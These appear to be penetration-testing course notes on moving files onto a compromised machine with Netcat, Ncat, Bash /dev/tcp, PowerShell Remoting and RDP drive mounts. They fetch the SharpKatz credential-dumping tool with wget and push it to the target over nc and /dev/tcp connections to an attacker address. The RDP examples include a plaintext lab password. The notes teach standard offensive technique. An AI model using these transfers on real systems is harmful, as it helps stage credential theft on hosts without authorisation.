# Netcat
Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

The original Netcat was released by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer SharpKatz.exe from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename, SharpKatz.exe.


`nc -l -p 8000 > SharpKatz.exe`

If the compromised machine is using Ncat, we'll need to specify --recv-only to close the connection once the file transfer is finished.

`ncat -l -p 8000 --recv-only > SharpKatz.exe`

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat. The option -q 0 will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

- `wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe`
- `nc -q 0 192.168.49.128 8000 < SharpKatz.exe`

If we use Ncat in our attack host, we can use --send-only instead of -q. --send-only in both connect and listen modes causes Ncat to quit when its input runs out. Usually, it will not stop until the network connection is closed because the remote side may still send something, but in the case of --send-only, there's no reason to receive anything more.

`ncat --send-only 192.168.49.128 8000 < SharpKatz.exe`

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file SharpKatz.exe as input to Netcat.

Attack host:
`sudo nc -l -p 443 -q 0 < SharpKatz.exe`

Compromised machine:
`nc 192.168.49.128 443 > SharpKatz.exe`


If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/.
Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.

Attacker machine:
`sudo nc -l -p 443 -q 0 < SharpKatz.exe`

Compromised machine:
`cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`

# PowerShell Session File Transfer

We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.

PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.

We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

## Create a PowerShell Remoting Session to DATABASE01
`$Session = New-PSSession -ComputerName DATABASE01`

We can use the Copy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa.
- `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`
- `Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

 # RDP
RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can use xfreerdp or rdesktop. At the time of writing, xfreerdp and rdesktop allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP session.

## Mounting a Linux Folder Using rdesktop
`rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`

## Mounting a Linux Folder Using xfreerdp
`xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`

To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session. Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.
